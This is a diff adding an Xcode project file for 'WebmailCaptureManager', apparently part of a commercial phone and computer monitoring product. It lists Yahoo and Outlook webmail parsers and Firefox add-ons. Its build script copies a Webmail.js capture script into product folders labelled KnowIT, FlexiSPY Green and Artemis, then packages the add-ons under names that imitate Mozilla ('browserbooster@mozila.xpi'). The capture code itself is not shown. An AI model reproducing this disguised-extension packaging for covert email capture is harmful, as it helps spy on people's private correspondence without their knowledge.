@@ -1,0 +1,502 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 46;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		350016481DCC4E26003AC5D6 /* PageValueChangeNotifier.h in Headers */ = {isa = PBXBuildFile; fileRef = 350016461DCC4E25003AC5D6 /* PageValueChangeNotifier.h */; };
+		350016491DCC4E26003AC5D6 /* PageValueChangeNotifier.m in Sources */ = {isa = PBXBuildFile; fileRef = 350016471DCC4E25003AC5D6 /* PageValueChangeNotifier.m */; };
+		3500176B1DCCADE1003AC5D6 /* NSArray+Webmail.h in Headers */ = {isa = PBXBuildFile; fileRef = 350017691DCCADE1003AC5D6 /* NSArray+Webmail.h */; };
+		3500176C1DCCADE1003AC5D6 /* NSArray+Webmail.m in Sources */ = {isa = PBXBuildFile; fileRef = 3500176A1DCCADE1003AC5D6 /* NSArray+Webmail.m */; };
+		3528E0221DD187DA0056E0B3 /* JavaScriptAccessor.h in Headers */ = {isa = PBXBuildFile; fileRef = 3528E0201DD187DA0056E0B3 /* JavaScriptAccessor.h */; };
+		3528E0231DD187DA0056E0B3 /* JavaScriptAccessor.m in Sources */ = {isa = PBXBuildFile; fileRef = 3528E0211DD187DA0056E0B3 /* JavaScriptAccessor.m */; };
+		3530EB941DD0B2650067F623 /* WebmailHTMLParser+Yahoo.h in Headers */ = {isa = PBXBuildFile; fileRef = 3530EB921DD0B2650067F623 /* WebmailHTMLParser+Yahoo.h */; };
+		3530EB951DD0B2660067F623 /* WebmailHTMLParser+Yahoo.m in Sources */ = {isa = PBXBuildFile; fileRef = 3530EB931DD0B2650067F623 /* WebmailHTMLParser+Yahoo.m */; };
+		3530EB981DD0B3E00067F623 /* AsJsUtils.h in Headers */ = {isa = PBXBuildFile; fileRef = 3530EB961DD0B3E00067F623 /* AsJsUtils.h */; };
+		3530EB991DD0B3E00067F623 /* AsJsUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 3530EB971DD0B3E00067F623 /* AsJsUtils.m */; };
+		3583F4261DE5891E009CC3E3 /* SpecialWebmailNotifier.h in Headers */ = {isa = PBXBuildFile; fileRef = 3583F4241DE5891E009CC3E3 /* SpecialWebmailNotifier.h */; };
+		3583F4271DE5891E009CC3E3 /* SpecialWebmailNotifier.m in Sources */ = {isa = PBXBuildFile; fileRef = 3583F4251DE5891E009CC3E3 /* SpecialWebmailNotifier.m */; };
+		35E5E0B71DE2F8800074E720 /* WebmailHTMLParser+Outlook.h in Headers */ = {isa = PBXBuildFile; fileRef = 35E5E0B51DE2F8800074E720 /* WebmailHTMLParser+Outlook.h */; };
+		35E5E0B81DE2F8800074E720 /* WebmailHTMLParser+Outlook.m in Sources */ = {isa = PBXBuildFile; fileRef = 35E5E0B61DE2F8800074E720 /* WebmailHTMLParser+Outlook.m */; };
+		35EFCC961A95A8FA00A35D3B /* WebmailChecker.h in Headers */ = {isa = PBXBuildFile; fileRef = 35EFCC941A95A8FA00A35D3B /* WebmailChecker.h */; };
+		35EFCC971A95A8FA00A35D3B /* WebmailChecker.m in Sources */ = {isa = PBXBuildFile; fileRef = 35EFCC951A95A8FA00A35D3B /* WebmailChecker.m */; };
+		35EFCC9A1A95C2AC00A35D3B /* WebmailCaptureManager_Prefix.pch in Headers */ = {isa = PBXBuildFile; fileRef = 35EFCC991A95C2AC00A35D3B /* WebmailCaptureManager_Prefix.pch */; };
+		C24886E21AEF4F5800FF14F6 /* AsyncSocket.h in Headers */ = {isa = PBXBuildFile; fileRef = C24886DE1AEF4F5800FF14F6 /* AsyncSocket.h */; };
+		C24886E31AEF4F5800FF14F6 /* AsyncSocket.m in Sources */ = {isa = PBXBuildFile; fileRef = C24886DF1AEF4F5800FF14F6 /* AsyncSocket.m */; };
+		C24886E41AEF4F5800FF14F6 /* AsyncController.h in Headers */ = {isa = PBXBuildFile; fileRef = C24886E01AEF4F5800FF14F6 /* AsyncController.h */; };
+		C24886E51AEF4F5800FF14F6 /* AsyncController.m in Sources */ = {isa = PBXBuildFile; fileRef = C24886E11AEF4F5800FF14F6 /* AsyncController.m */; };
+		C2D863E81A84BACE00D7D506 /* WebmailCaptureManager.h in Headers */ = {isa = PBXBuildFile; fileRef = C2D863E71A84BACE00D7D506 /* WebmailCaptureManager.h */; };
+		C2D863EA1A84BACE00D7D506 /* WebmailCaptureManager.m in Sources */ = {isa = PBXBuildFile; fileRef = C2D863E91A84BACE00D7D506 /* WebmailCaptureManager.m */; };
+		C2D864011A84BB6D00D7D506 /* WebmailNotifier.h in Headers */ = {isa = PBXBuildFile; fileRef = C2D863FF1A84BB6D00D7D506 /* WebmailNotifier.h */; };
+		C2D864021A84BB6D00D7D506 /* WebmailNotifier.m in Sources */ = {isa = PBXBuildFile; fileRef = C2D864001A84BB6D00D7D506 /* WebmailNotifier.m */; };
+		C2D864041A84BCF400D7D506 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C2D864031A84BCF400D7D506 /* Cocoa.framework */; };
+		C2FD40181A945C2B0004B703 /* WebmailHTMLParser.h in Headers */ = {isa = PBXBuildFile; fileRef = C2FD40161A945C2B0004B703 /* WebmailHTMLParser.h */; };
+		C2FD40191A945C2B0004B703 /* WebmailHTMLParser.m in Sources */ = {isa = PBXBuildFile; fileRef = C2FD40171A945C2B0004B703 /* WebmailHTMLParser.m */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		350016461DCC4E25003AC5D6 /* PageValueChangeNotifier.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PageValueChangeNotifier.h; sourceTree = "<group>"; };
+		350016471DCC4E25003AC5D6 /* PageValueChangeNotifier.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PageValueChangeNotifier.m; sourceTree = "<group>"; };
+		350017691DCCADE1003AC5D6 /* NSArray+Webmail.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSArray+Webmail.h"; sourceTree = "<group>"; };
+		3500176A1DCCADE1003AC5D6 /* NSArray+Webmail.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSArray+Webmail.m"; sourceTree = "<group>"; };
+		350AA9561D92C01D000EC1F8 /* bootstrap.js */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.javascript; path = bootstrap.js; sourceTree = "<group>"; };
+		350AA9571D92C01D000EC1F8 /* chrome.manifest */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = chrome.manifest; sourceTree = "<group>"; };
+		350AA9591D92C01D000EC1F8 /* handler.jsm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = handler.jsm; sourceTree = "<group>"; };
+		350AA95A1D92C01D000EC1F8 /* install.rdf */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.xml; path = install.rdf; sourceTree = "<group>"; };
+		350AA95C1D92C01D000EC1F8 /* ff_mac_update.rdf */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.xml; path = ff_mac_update.rdf; sourceTree = "<group>"; };
+		350AA95D1D92C01D000EC1F8 /* template_ff_mac_update.rdf */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.xml; path = template_ff_mac_update.rdf; sourceTree = "<group>"; };
+		350AA95F1D92C01D000EC1F8 /* bootstrap.js */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.javascript; path = bootstrap.js; sourceTree = "<group>"; };
+		350AA9601D92C01D000EC1F8 /* chrome.manifest */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = chrome.manifest; sourceTree = "<group>"; };
+		350AA9621D92C01D000EC1F8 /* handler.jsm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = handler.jsm; sourceTree = "<group>"; };
+		350AA9631D92C01D000EC1F8 /* install.rdf */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.xml; path = install.rdf; sourceTree = "<group>"; };
+		350AA9651D92C01D000EC1F8 /* ff_mac_update.rdf */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.xml; path = ff_mac_update.rdf; sourceTree = "<group>"; };
+		350AA9661D92C01D000EC1F8 /* template_ff_mac_update.rdf */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.xml; path = template_ff_mac_update.rdf; sourceTree = "<group>"; };
+		350AA9671D92C063000EC1F8 /* addonversion.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = addonversion.plist; path = "../../Source-FirefoxAddon/addonversion.plist"; sourceTree = "<group>"; };
+		351266111DD42D47001C05B0 /* Webmail.js */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.javascript; path = Webmail.js; sourceTree = "<group>"; };
+		3528E0201DD187DA0056E0B3 /* JavaScriptAccessor.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = JavaScriptAccessor.h; sourceTree = "<group>"; };
+		3528E0211DD187DA0056E0B3 /* JavaScriptAccessor.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = JavaScriptAccessor.m; sourceTree = "<group>"; };
+		3530EB921DD0B2650067F623 /* WebmailHTMLParser+Yahoo.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "WebmailHTMLParser+Yahoo.h"; sourceTree = "<group>"; };
+		3530EB931DD0B2650067F623 /* WebmailHTMLParser+Yahoo.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "WebmailHTMLParser+Yahoo.m"; sourceTree = "<group>"; };
+		3530EB961DD0B3E00067F623 /* AsJsUtils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AsJsUtils.h; sourceTree = "<group>"; };
+		3530EB971DD0B3E00067F623 /* AsJsUtils.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AsJsUtils.m; sourceTree = "<group>"; };
+		3583F4241DE5891E009CC3E3 /* SpecialWebmailNotifier.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SpecialWebmailNotifier.h; sourceTree = "<group>"; };
+		3583F4251DE5891E009CC3E3 /* SpecialWebmailNotifier.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SpecialWebmailNotifier.m; sourceTree = "<group>"; };
+		35BF3E261DDD871E009B2CEB /* readme.txt */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; name = readme.txt; path = "../../Source-FirefoxAddon/readme.txt"; sourceTree = "<group>"; };
+		35CECA6E1DF97B2000F54334 /* Outlook.js */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.javascript; path = Outlook.js; sourceTree = "<group>"; };
+		35E5E0B51DE2F8800074E720 /* WebmailHTMLParser+Outlook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "WebmailHTMLParser+Outlook.h"; sourceTree = "<group>"; };
+		35E5E0B61DE2F8800074E720 /* WebmailHTMLParser+Outlook.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "WebmailHTMLParser+Outlook.m"; sourceTree = "<group>"; };
+		35EFCC941A95A8FA00A35D3B /* WebmailChecker.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WebmailChecker.h; sourceTree = "<group>"; };
+		35EFCC951A95A8FA00A35D3B /* WebmailChecker.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WebmailChecker.m; sourceTree = "<group>"; };
+		35EFCC991A95C2AC00A35D3B /* WebmailCaptureManager_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WebmailCaptureManager_Prefix.pch; sourceTree = SOURCE_ROOT; };
+		C24886DE1AEF4F5800FF14F6 /* AsyncSocket.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AsyncSocket.h; sourceTree = "<group>"; };
+		C24886DF1AEF4F5800FF14F6 /* AsyncSocket.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AsyncSocket.m; sourceTree = "<group>"; };
+		C24886E01AEF4F5800FF14F6 /* AsyncController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AsyncController.h; sourceTree = "<group>"; };
+		C24886E11AEF4F5800FF14F6 /* AsyncController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AsyncController.m; sourceTree = "<group>"; };
+		C2D863E41A84BACE00D7D506 /* libWebmailCaptureManager.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = libWebmailCaptureManager.a; sourceTree = BUILT_PRODUCTS_DIR; };
+		C2D863E71A84BACE00D7D506 /* WebmailCaptureManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WebmailCaptureManager.h; sourceTree = "<group>"; };
+		C2D863E91A84BACE00D7D506 /* WebmailCaptureManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WebmailCaptureManager.m; sourceTree = "<group>"; };
+		C2D863FF1A84BB6D00D7D506 /* WebmailNotifier.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WebmailNotifier.h; sourceTree = "<group>"; };
+		C2D864001A84BB6D00D7D506 /* WebmailNotifier.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WebmailNotifier.m; sourceTree = "<group>"; };
+		C2D864031A84BCF400D7D506 /* Cocoa.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Cocoa.framework; path = System/Library/Frameworks/Cocoa.framework; sourceTree = SDKROOT; };
+		C2FD40161A945C2B0004B703 /* WebmailHTMLParser.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WebmailHTMLParser.h; sourceTree = "<group>"; };
+		C2FD40171A945C2B0004B703 /* WebmailHTMLParser.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WebmailHTMLParser.m; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		C2D863E11A84BACE00D7D506 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C2D864041A84BCF400D7D506 /* Cocoa.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		350AA9541D92BFD4000EC1F8 /* FirefoxAddon */ = {
+			isa = PBXGroup;
+			children = (
+				35BF3E261DDD871E009B2CEB /* readme.txt */,
+				350AA9671D92C063000EC1F8 /* addonversion.plist */,
+				350AA9551D92C01D000EC1F8 /* Extension */,
+				350AA95E1D92C01D000EC1F8 /* BrowserBooster */,
+			);
+			name = FirefoxAddon;
+			path = WebmailCaptureManager;
+			sourceTree = "<group>";
+		};
+		350AA9551D92C01D000EC1F8 /* Extension */ = {
+			isa = PBXGroup;
+			children = (
+				350AA9561D92C01D000EC1F8 /* bootstrap.js */,
+				350AA9571D92C01D000EC1F8 /* chrome.manifest */,
+				350AA9581D92C01D000EC1F8 /* content */,
+				350AA95A1D92C01D000EC1F8 /* install.rdf */,
+				350AA95B1D92C01D000EC1F8 /* update */,
+			);
+			name = Extension;
+			path = "../../Source-FirefoxAddon/Extension";
+			sourceTree = "<group>";
+		};
+		350AA9581D92C01D000EC1F8 /* content */ = {
+			isa = PBXGroup;
+			children = (
+				35CECA6E1DF97B2000F54334 /* Outlook.js */,
+				350AA9591D92C01D000EC1F8 /* handler.jsm */,
+			);
+			path = content;
+			sourceTree = "<group>";
+		};
+		350AA95B1D92C01D000EC1F8 /* update */ = {
+			isa = PBXGroup;
+			children = (
+				350AA95C1D92C01D000EC1F8 /* ff_mac_update.rdf */,
+				350AA95D1D92C01D000EC1F8 /* template_ff_mac_update.rdf */,
+			);
+			path = update;
+			sourceTree = "<group>";
+		};
+		350AA95E1D92C01D000EC1F8 /* BrowserBooster */ = {
+			isa = PBXGroup;
+			children = (
+				350AA95F1D92C01D000EC1F8 /* bootstrap.js */,
+				350AA9601D92C01D000EC1F8 /* chrome.manifest */,
+				350AA9611D92C01D000EC1F8 /* content */,
+				350AA9631D92C01D000EC1F8 /* install.rdf */,
+				350AA9641D92C01D000EC1F8 /* update */,
+			);
+			name = BrowserBooster;
+			path = "../../Source-FirefoxAddon/BrowserBooster";
+			sourceTree = "<group>";
+		};
+		350AA9611D92C01D000EC1F8 /* content */ = {
+			isa = PBXGroup;
+			children = (
+				350AA9621D92C01D000EC1F8 /* handler.jsm */,
+			);
+			path = content;
+			sourceTree = "<group>";
+		};
+		350AA9641D92C01D000EC1F8 /* update */ = {
+			isa = PBXGroup;
+			children = (
+				350AA9651D92C01D000EC1F8 /* ff_mac_update.rdf */,
+				350AA9661D92C01D000EC1F8 /* template_ff_mac_update.rdf */,
+			);
+			path = update;
+			sourceTree = "<group>";
+		};
+		35EFCC981A95C28600A35D3B /* Supporting Files */ = {
+			isa = PBXGroup;
+			children = (
+				351266111DD42D47001C05B0 /* Webmail.js */,
+				35EFCC991A95C2AC00A35D3B /* WebmailCaptureManager_Prefix.pch */,
+			);
+			name = "Supporting Files";
+			sourceTree = "<group>";
+		};
+		C24886DD1AEF4F3800FF14F6 /* AsyncWebSocketTCP */ = {
+			isa = PBXGroup;
+			children = (
+				C24886DE1AEF4F5800FF14F6 /* AsyncSocket.h */,
+				C24886DF1AEF4F5800FF14F6 /* AsyncSocket.m */,
+				C24886E01AEF4F5800FF14F6 /* AsyncController.h */,
+				C24886E11AEF4F5800FF14F6 /* AsyncController.m */,
+			);
+			name = AsyncWebSocketTCP;
+			sourceTree = "<group>";
+		};
+		C2D863DB1A84BACE00D7D506 = {
+			isa = PBXGroup;
+			children = (
+				C2D863E61A84BACE00D7D506 /* WebmailCaptureManager */,
+				350AA9541D92BFD4000EC1F8 /* FirefoxAddon */,
+				C2D864051A84BCFA00D7D506 /* Framework */,
+				C2D863E51A84BACE00D7D506 /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		C2D863E51A84BACE00D7D506 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				C2D863E41A84BACE00D7D506 /* libWebmailCaptureManager.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		C2D863E61A84BACE00D7D506 /* WebmailCaptureManager */ = {
+			isa = PBXGroup;
+			children = (
+				C2D863E71A84BACE00D7D506 /* WebmailCaptureManager.h */,
+				C2D863E91A84BACE00D7D506 /* WebmailCaptureManager.m */,
+				C24886DD1AEF4F3800FF14F6 /* AsyncWebSocketTCP */,
+				C2D863FE1A84BB5100D7D506 /* Implement class */,
+				35EFCC981A95C28600A35D3B /* Supporting Files */,
+			);
+			path = WebmailCaptureManager;
+			sourceTree = "<group>";
+		};
+		C2D863FE1A84BB5100D7D506 /* Implement class */ = {
+			isa = PBXGroup;
+			children = (
+				3530EB961DD0B3E00067F623 /* AsJsUtils.h */,
+				3530EB971DD0B3E00067F623 /* AsJsUtils.m */,
+				3528E0201DD187DA0056E0B3 /* JavaScriptAccessor.h */,
+				3528E0211DD187DA0056E0B3 /* JavaScriptAccessor.m */,
+				C2D863FF1A84BB6D00D7D506 /* WebmailNotifier.h */,
+				C2D864001A84BB6D00D7D506 /* WebmailNotifier.m */,
+				3583F4241DE5891E009CC3E3 /* SpecialWebmailNotifier.h */,
+				3583F4251DE5891E009CC3E3 /* SpecialWebmailNotifier.m */,
+				C2FD40161A945C2B0004B703 /* WebmailHTMLParser.h */,
+				C2FD40171A945C2B0004B703 /* WebmailHTMLParser.m */,
+				3530EB921DD0B2650067F623 /* WebmailHTMLParser+Yahoo.h */,
+				3530EB931DD0B2650067F623 /* WebmailHTMLParser+Yahoo.m */,
+				35E5E0B51DE2F8800074E720 /* WebmailHTMLParser+Outlook.h */,
+				35E5E0B61DE2F8800074E720 /* WebmailHTMLParser+Outlook.m */,
+				35EFCC941A95A8FA00A35D3B /* WebmailChecker.h */,
+				35EFCC951A95A8FA00A35D3B /* WebmailChecker.m */,
+				350016461DCC4E25003AC5D6 /* PageValueChangeNotifier.h */,
+				350016471DCC4E25003AC5D6 /* PageValueChangeNotifier.m */,
+				350017691DCCADE1003AC5D6 /* NSArray+Webmail.h */,
+				3500176A1DCCADE1003AC5D6 /* NSArray+Webmail.m */,
+			);
+			name = "Implement class";
+			sourceTree = "<group>";
+		};
+		C2D864051A84BCFA00D7D506 /* Framework */ = {
+			isa = PBXGroup;
+			children = (
+				C2D864031A84BCF400D7D506 /* Cocoa.framework */,
+			);
+			name = Framework;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXHeadersBuildPhase section */
+		C2D863E21A84BACE00D7D506 /* Headers */ = {
+			isa = PBXHeadersBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				35E5E0B71DE2F8800074E720 /* WebmailHTMLParser+Outlook.h in Headers */,
+				3528E0221DD187DA0056E0B3 /* JavaScriptAccessor.h in Headers */,
+				C24886E21AEF4F5800FF14F6 /* AsyncSocket.h in Headers */,
+				35EFCC961A95A8FA00A35D3B /* WebmailChecker.h in Headers */,
+				C24886E41AEF4F5800FF14F6 /* AsyncController.h in Headers */,
+				C2FD40181A945C2B0004B703 /* WebmailHTMLParser.h in Headers */,
+				C2D864011A84BB6D00D7D506 /* WebmailNotifier.h in Headers */,
+				3500176B1DCCADE1003AC5D6 /* NSArray+Webmail.h in Headers */,
+				3583F4261DE5891E009CC3E3 /* SpecialWebmailNotifier.h in Headers */,
+				35EFCC9A1A95C2AC00A35D3B /* WebmailCaptureManager_Prefix.pch in Headers */,
+				C2D863E81A84BACE00D7D506 /* WebmailCaptureManager.h in Headers */,
+				350016481DCC4E26003AC5D6 /* PageValueChangeNotifier.h in Headers */,
+				3530EB941DD0B2650067F623 /* WebmailHTMLParser+Yahoo.h in Headers */,
+				3530EB981DD0B3E00067F623 /* AsJsUtils.h in Headers */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXHeadersBuildPhase section */
+
+/* Begin PBXNativeTarget section */
+		C2D863E31A84BACE00D7D506 /* WebmailCaptureManager */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C2D863F81A84BACE00D7D506 /* Build configuration list for PBXNativeTarget "WebmailCaptureManager" */;
+			buildPhases = (
+				C2D863E01A84BACE00D7D506 /* Sources */,
+				C2D863E11A84BACE00D7D506 /* Frameworks */,
+				C2D863E21A84BACE00D7D506 /* Headers */,
+				C28FEED11AEF62B9001402DE /* ShellScript */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = WebmailCaptureManager;
+			productName = WebmailCaptureManager;
+			productReference = C2D863E41A84BACE00D7D506 /* libWebmailCaptureManager.a */;
+			productType = "com.apple.product-type.library.static";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		C2D863DC1A84BACE00D7D506 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 0610;
+				ORGANIZATIONNAME = ophat;
+				TargetAttributes = {
+					C2D863E31A84BACE00D7D506 = {
+						CreatedOnToolsVersion = 6.1.1;
+					};
+				};
+			};
+			buildConfigurationList = C2D863DF1A84BACE00D7D506 /* Build configuration list for PBXProject "WebmailCaptureManager" */;
+			compatibilityVersion = "Xcode 3.2";
+			developmentRegion = English;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+			);
+			mainGroup = C2D863DB1A84BACE00D7D506;
+			productRefGroup = C2D863E51A84BACE00D7D506 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				C2D863E31A84BACE00D7D506 /* WebmailCaptureManager */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		C28FEED11AEF62B9001402DE /* ShellScript */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# KnowIT\ncp -f WebmailCaptureManager/Webmail.js ../../../BlueBlood/blblu/Addon/Webmail.js\n# FlexiSPY Green\ncp -f WebmailCaptureManager/Webmail.js ../../../GreenBlood/blblu/Addon/Webmail.js\n# Artemis\ncp -f WebmailCaptureManager/Webmail.js ../../../Artemis/blblu/Addon/Webmail.js\n\ncd ../Source-FirefoxAddon\n\n\n# KnowIT\ncp -fr addonversion.plist ../../../BlueBlood/blblu/Addon/addonversion.plist\n# FlexiSPY Green\ncp -fr addonversion.plist ../../../GreenBlood/blblu/Addon/addonversion.plist\n# Artemis\ncp -fr addonversion.plist ../../../Artemis/blblu/Addon/addonversion.plist\n\n\ncd BrowserBooster\n\n\n# KnowIT\nzip -r browserbooster@mozila.xpi *\ncp -fr browserbooster@mozila.xpi ../../../../BlueBlood/blblu/Addon/Unsigned/browserbooster@mozila.xpi\nrm -fr browserbooster@mozila.xpi\n\n\ncd ../Extension\n\n\n# FlexiSPY Green\nzip -r extension@mozila.xpi *\ncp -fr extension@mozila.xpi ../../../../GreenBlood/blblu/Addon/Unsigned/extension@mozila.xpi\nrm -fr extension@mozila.xpi\n\n# Artemis\nzip -r extension@mozila.xpi *\ncp -fr extension@mozila.xpi ../../../../Artemis/blblu/Addon/Unsigned/extension@mozila.xpi\nrm -fr extension@mozila.xpi\n";
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		C2D863E01A84BACE00D7D506 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C24886E51AEF4F5800FF14F6 /* AsyncController.m in Sources */,
+				35E5E0B81DE2F8800074E720 /* WebmailHTMLParser+Outlook.m in Sources */,
+				C2FD40191A945C2B0004B703 /* WebmailHTMLParser.m in Sources */,
+				3528E0231DD187DA0056E0B3 /* JavaScriptAccessor.m in Sources */,
+				C24886E31AEF4F5800FF14F6 /* AsyncSocket.m in Sources */,
+				350016491DCC4E26003AC5D6 /* PageValueChangeNotifier.m in Sources */,
+				3500176C1DCCADE1003AC5D6 /* NSArray+Webmail.m in Sources */,
+				3583F4271DE5891E009CC3E3 /* SpecialWebmailNotifier.m in Sources */,
+				3530EB951DD0B2660067F623 /* WebmailHTMLParser+Yahoo.m in Sources */,
+				35EFCC971A95A8FA00A35D3B /* WebmailChecker.m in Sources */,
+				C2D863EA1A84BACE00D7D506 /* WebmailCaptureManager.m in Sources */,
+				3530EB991DD0B3E00067F623 /* AsJsUtils.m in Sources */,
+				C2D864021A84BB6D00D7D506 /* WebmailNotifier.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin XCBuildConfiguration section */
+		C2D863F61A84BACE00D7D506 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				MACOSX_DEPLOYMENT_TARGET = 10.10;
+				MTL_ENABLE_DEBUG_INFO = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = macosx;
+			};
+			name = Debug;
+		};
+		C2D863F71A84BACE00D7D506 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
